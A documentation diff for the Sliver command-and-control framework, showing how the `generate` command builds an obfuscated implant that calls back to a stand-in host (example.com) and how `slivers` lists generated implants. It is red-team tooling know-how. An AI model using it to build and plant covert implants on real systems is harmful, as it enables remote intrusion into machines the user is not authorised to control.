@@ -35,12 +35,32 @@ Generating implants is done using the `generate` command, you must specify at le
 
 ```
 sliver > generate --mtls example.com --save /Users/moloch/Desktop
+
 [*] Generating new windows/amd64 Sliver binary
 [*] Symbol obfuscation is enabled, this process takes about 15 minutes
+[*] Build completed in 00:10:16
+[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
 
 ```
 
 __IMPORTANT:__ The symbol obfuscation process can take 15+ mintues to complete depending on your server's CPU resources. You can skip this step with `--skip-symbols` but a lot of sketchy information will end up in the binaries that get generated. You should only use this flag if you're just playing around, or do not care about stealth.
+
+The server will also assign codenames to each generated binary i.e. `NEW_GRAPE.exe` you can rename file to anything you need to but these codenames will still uniquely identify the generated binary. You can also view all previously generated implant binaries with the `slivers` command:
+
+```
+sliver > slivers
+
+Name                    OS/Arch        Debug  Format
+====                    =======        =====  ======
+CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
+LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
+RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
+RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
+MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
+MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
+SICK_SPY                darwin/amd64   false  EXECUTABLE
+```
+
 
 
 ## Getting Shells
